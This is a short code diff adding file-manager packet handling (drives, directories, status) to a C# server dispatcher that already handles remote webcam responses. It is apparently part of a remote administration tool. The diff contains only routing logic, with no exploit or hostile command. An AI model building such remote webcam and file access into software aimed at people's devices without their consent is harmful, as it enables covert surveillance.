@@ -1,7 +1,6 @@
 ﻿using Serveur.Controllers;
 using Serveur.Controllers.Server;
 using Serveur.Packets.ClientPackets;
-using System.Windows.Forms;
 
 namespace Serveur.Packets
 {
@@ -30,6 +29,18 @@ namespace Serveur.Packets
             else if (type == TypePackets.GetWebcamResponse)
             {
                 FrmRemoteWebcamController.getWebcamResponse(client, (GetWebcamResponse)packet);
+            }
+            else if (type == TypePackets.GetDrivesResponse)
+            {
+                FrmFileManagerController.getDrivesResponse(client, (GetDrivesResponse)packet);
+            }
+            else if (type == TypePackets.GetDirectoryResponse)
+            {
+                FrmFileManagerController.getDirectoryResponse(client, (GetDirectoryResponse)packet);
+            }
+            else if (type == TypePackets.SetStatusFileManager)
+            {
+                FrmFileManagerController.setStatusFileManager(client, (SetStatusFileManager)packet);         
             }
         }
     }
